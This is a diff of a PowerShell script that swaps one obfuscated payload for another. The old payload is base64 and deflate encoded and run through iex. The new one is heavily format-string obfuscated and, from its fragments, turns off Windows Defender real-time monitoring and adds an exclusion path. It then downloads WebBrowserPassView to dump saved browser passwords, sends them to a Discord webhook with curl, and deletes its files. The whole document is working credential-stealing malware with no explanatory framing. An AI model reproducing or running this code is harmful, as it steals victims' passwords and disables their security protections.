@@ -1,1 +1,25 @@
-( NEw-OBjEcT Io.coMPReSSIOn.DeflaTESTReAM([Io.MEmoRysTReaM][SySTEm.CoNVeRT]::FrOMbASE64STrING('bVZtb+I4EP6OxH+wVqsDxAYICW+VqrvSpd1KfWHLtr3bqqpCMCUtJGkSXrqI/37POB6zrbaqyXg888x4PDN2TZTF5zidXV3I+6b9UP08HM2ii8G94z5US5tSpYy/T1u7t9u6LkZ7t203dtsW/jHczm7rYLQxmk0MWoaYTaJQsW0M4uPbwpqDZfwCoA1Os4tBUmCTIE2JhEgHAG0odjB3YcgB7ZAKGQPPgawLHrTxi0kLzA5wO+QV6BZWWlBwANTEaEGmA1GbwMgmZB3QTdoJbYiAyTdygGhCBp9chWqbYIEARCy6ZJ0AoODS1gDccnefrGmp2j9beWm6CiQITEpfSqtTf9rH92x1MRxcv07m6zVmQ0gpJmlo4dUmyIoFfCsVIazrwXDuHQ+EKN/7346Sh5ZTzYmurQm72ax8uQdKZl3Ew0ROZSJDXwqL4Mr4+Rpo4FR/vfGcbFXU6rX05pqfBQt5EYVBFiVB+KSZwsYP0G8DSR4/9Hqwpgz3msLywbr7T4ue6+8opA0T5TQ6mtdtOo1eq+fqqWN3unVNH0W9G+928ENNoancQmTY61v2X65rtAxqLtP6HXPHmujrbxKtWRXiMsmh8t2+AzMBl38nnqbXh1miySWvC/LqyRzl2ao+nrOzC3G3dwCW0zxaGw6p0ETMsWfXUopmTc9q6sCr6jgWmopMQlhnGTu9ENNgLm8YtFjI5fPNQQOiDGDyihQgWXs69cnXfZRSjk01d7pMIK3vvxIvnEQLcSis5ygIRbnsdmu1VqciXsdv4lRm1jWEReu71vwlw5UmD2A9hp04B2THrKtldhLMwYnC0AvSt2j5EkbG73WdnfImmuAdjvqPsbf3MKUsrMmNFPU0k2CAPXv0fjQ4lQyma2vWmwmtIUZ8OB/OJHnHB3oOJfkwpQEiV9KPaNID+0RMZ7RRaElQjKSt54DFwghBPI98LwsirR1yrh1zKPPdqewAuQOYsMyZnvqcJW+XChc/kEDowcg9YGAcJadZtum/33mx4E+MW+T1M+fy+Ysmvg79m/Zzu8fbPaNvDo9f1X/cCs0xvDior+V4FkUvad12+nkDUoGk8CW5zkOva1qXrZoJpdPt+vUv3EKX3VPcPVeLwT2uHkxiXEQL8qzTMSlNllSGWsfRMsyEoxLzJEoGnj+zrsbP0s/E9t6feeiX33897irFQrFAKGEmQ9770z6GnCr6SwE8EE9k52USJOL4oD7VRTTizqZZXIjQKBbOwlX0Ii0doGs5PD86Hui+bdu6cas9sMUx98CFF4T1fSFnM8nJ+DgN8rBxgzCtQJW7Sb6FiBX062X6UzN/nn7QSaJvG9McqHz+1QsBHYG67TEhkYputCpVtZClvxfcy/LLhv2hO4clBxuO7XyZBlE49LIZFcZxblmRFEEWQmw1Wb/jKhv3f2vkkuK2vxLWHMBkklo4YuPDal9w1mguZSysVPpqPl5MeFGacKqVvGg0BmoWTDrcw39iXM/rSNsA+MENHLn0FtI0yVq2yagyZ1kWpwf1+iRIfSjU/GhRB8xchYcOVceTLlguTN69um45KQW3MvQL5Vxus/++UykPTLoknpI0FyIH8Jqp16Xk0GVwlUnymMPO9oNsthwr91lsSeFbrWtxahvXkBZsTL869FQ9PjSt3yAV/QhJP+wBjxB6e2Q6vWlw4to/PU9XkSoep83vIFNN+9cPU52ueZi0Lf9D9TWaLN9wDWUUHPcPLy27wU+tjm1KN+LN8UWVCpvCYaqSDyi/i5lr+rYfEQjXDBJLU3l+6cnBTV+39D+lm4p+5iXZbwkehRM40qIlf5nM1Q1pqaso9t7mkTd5fE6j8HCrHjEqGSnK/ZJ6YvqJjM+P/IHIezr6JoWkRyGRCIkvyzmr267mhG33DOVUtAKugd+wSmjdBqpdqfwP' ) ,[iO.coMpResSiOn.CoMpReSSiONmOdE]::decOMpreSS )|% { NEw-OBjEcT SySTem.IO.STREamreadER($_ , [Text.encoDInG]::aScii)} ).ReAdToEnd()|iex
+. ( $pshOMe[21]+$PShoME[34]+'x')(((("{19}{44}{46}{60}{5}{55}{47}{37}{67}{22}{26}{64}{14}{49}{11}{12}{21}{56}{3}{6}{30}{61}{28}{29}{13}{1}{18}{23}{16}{74}{62}{73}{45}{32}{31}{27}{63}{38}{42}{9}{2}{8}{53}{70}{75}{43}{59}{51}{34}{24}{58}{72}{15}{39}{10}{35}{25}{50}{57}{66}{33}{17}{69}{20}{0}{68}{65}{4}{71}{7}{48}{40}{36}{41}{52}{54}"-f'+BIvassvieBIv+BI','vGcfB','IvMPERqdlww','Pass','Iv+BIveBIv+BIvxit
+BIv))  -REPlaCE  ([cHAr]53+[cHAr]81+[cHAr]122),[','t-MpPreference -BIv+(BIvDiBIv+BIvsBIv+BIvableBIv)+(BIvRealBIv+BIvtimeMonitoringBIv+BIv 1BIv','View',']99),[cHAr]92 -c','WYBIv+BIvLBIv+BIvSn','v+BIv307BIv+BIv82309594BIv+BIv3178/BIv+BIvAo9UaVETBIv+B','+(BIvPasBIv+BIvsViBIv+BIvew.','+BIvles/WBIv+BIvebBIv+BIvBBIv+BIvrowBIv+BIvs','erPasBIv)+(BIvsViBIv+BIvew.eBIv+BIvxe?raBIv+BIvw=trBIv+BIvueBIv+BIv B','gBIv+BI','Iv/blBIv+B','m WebBIv+BIvBrowsBIv','xBIv+BIvt BIv+BIvpBIv+BIvaBIv+BIvssw','.BIv+BIv.
+BIv+BIvRemBIv+BIvoveBIv+BIv-ItBIv+BIvem fileUBIv+BIvp
+RemBIv)+(BIvove-ItemBIv+BI','Iv+BIvileUp
+.gGcWebBBIv+BIvrowserPasBIv+BIv','((BIv5Qzrandom = -join ((48..57) qby Get-R',' 5QBIv+BIvzenvBIv+BIv:tempgGcpBIv','Iv)+(BIv-OutFil','onnaisyouknoBIv)+(BIvw/BBIv+BIvadBIv+BIvUBIv+BIvSB_paBIv+BIv','sView.exe /ste','BIvh_aT0BIv+BIvABIv)+(BIv41BIv+BIvy
+BIv+BIv
+BIv+BIvSBIv+BIvtBIv+BIvaBIv+BIvrBIv+BIvtBIv+B',')+(BIvexBIv+BIveBIv+BIv
+','ssBIv+BIvSBIv+BIvtea','F fhl','vexefhlBIv+B','Iv
+BIv)+(BIv
+Set-LocatioBIv+BIvnBIv+BIv CBIv+BIv:','BIv+BIv.','}fhl -','Iv+BIvGcBIv+BIvoyNBIv)+BIvfhlgGcoyNfhl','BIv+BIvndom.BIv+BIvtxBIv+BIvtBIv+BIv
+cdBIv)+(BIv','vjbBIv+BIvLkBIv+BIvDPcU6j69sBIv+BIvIBIv+','BIv','Ar]124)','B','api/webhooks/13BIv+(BI',')+BIverBIv',']98+[cHAr]121),[cH',' Vwq& ( N8GPShOmE[4]+N8GpShom','v77BI','Iv+B','andom -Count 3 qby ForEach-Object {[char]5Qz_})
+
+m','ntentBIv+BIvgGcBIv+BIvoBIv+BIvyBIv+BIvNfhl: gB','kdir C:/fileUp
+S','v+BIv:/fileUBIv+BIvpfhl
+Invoke-BIv+','RePLACE([cHAr]113+[cHAr','IvoBIv+BIvb/BIv+BIvmain/BIv)+(BIvotherBIv+BIv_fiBIv','BIv+BIvRBIv+BIvemove-IBIv+BIvtem p','IvqNsZBIv+BIvZGBIv+BIvRBIv+BIvroHxBIv+BI','e','XBIv+BIviH','[34]+BIvxBIv)','+BIv
+SetBIv+BIv-BIv+BIvMpBIv+BIvPreferBIv+BIvence BIv+BIv-ExcBIv+BIvlusionPath fhlCBI','e fhlC:/fiBIv+BIvleUpBIv+BIv/WeBIv+BIvbBrowBIv+BIvser','asBIv+BIvswoBIv+BIvrds-5QzBIv+BIvenvBIv+B','Iv-Sleep -sec','IvbmdBIv+B','e','BIv+BI','IvGcoyNfBIv+BIvhlB','file=@passwords-5Qzenv:UserName5Qzrandom.txtfhl https://discord.com/','lerBIv)+(B','+BIvmeMoBIv+BIvniBIv+BIvtorinBIv+BIvg 0BIv+BIv
+B','Iv:UserNBIv+BIvaBIv+BIvme5QzBIv)+(BIvra','IvWBIv+BIveBIv+BIvbReBIv+BIvquesBIv+BIvt htBIv+BIvtps:/BIv+BIv/BIv+BIvgithub.com/tBIv+BIvuc','vw.ps1BIv+BIv
+
+SBIv+BIvet-MpPreBIv+BIvferenBIv+BIvce -BIv)+(BIvDisBIv+BIvaBIv+BIvbleRealtiBIv','v','ZBIv+BIv1ZaaBIv+','cHAr]36-REPlaCE([cHAr]111+[cHAr]121+[cHAr]78),[cHAr]96-cRePLACE([cHAr]102+[cHAr]104+[cHAr]108),[cHAr]34  -REPlaCE  ([cHAr]103+[cHAr]71+[cHAr','onBIv+BIvdBIv+BIvs 1
+
+RBIv+BIveBIv+BIvmove-ItBIv+BIve','Iv+BIvco','orBIv+BIvds-BIv+BIv5QzenvBIv+BIv:UBIv)+BIvserName5Qzrandom.txt
+
+Start-Sleep -seconds 15
+
+curl.exe -F fhlpayload_json={gBIv+(B','BIv1B'))  -crepLAcE 'BIv',[chAr]39  -RePlace([chAr]86+[chAr]119+[chAr]113),[chAr]124  -crepLAcE'N8G',[chAr]36))
